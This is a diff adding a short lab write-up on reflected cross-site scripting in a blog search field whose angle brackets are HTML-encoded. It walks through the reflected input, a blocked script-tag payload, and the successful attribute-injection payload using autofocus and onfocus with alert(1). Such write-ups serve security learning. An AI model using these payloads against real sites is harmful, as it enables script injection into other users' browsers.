@@ -1,0 +1,25 @@
+Lab #9 - Reflected XSS into attribute with angle brackets HTML-encoded
+
+Vulnerability - This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded.
+
+Goal - To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function.
+
+Analysis:
+1. Search abc123 => the term is displayed on the screen (It is reflected)
+=> see in the response contains: 
+<form action=/ method=GET>
+    <input type=text placeholder='Search the blog...' name=search value="abc123">
+    <button type=submit class=button>Search</button>
+</form>
+
+2. Inject a script into this input:
+"><script>alert(1)</script> 
+=> See that it is HTML-encoded: 
+<form action=/ method=GET>
+    <input type=text placeholder='Search the blog...' name=search value=""&gt;&lt;script&gt;alert(1)&lt;/script&gt;">
+    <button type=submit class=button>Search</button>
+</form>
+
+3. Inject a attribute into this input:
+" autofocus onfocus=alert(1) x="
+=> SUCCESSFULLY
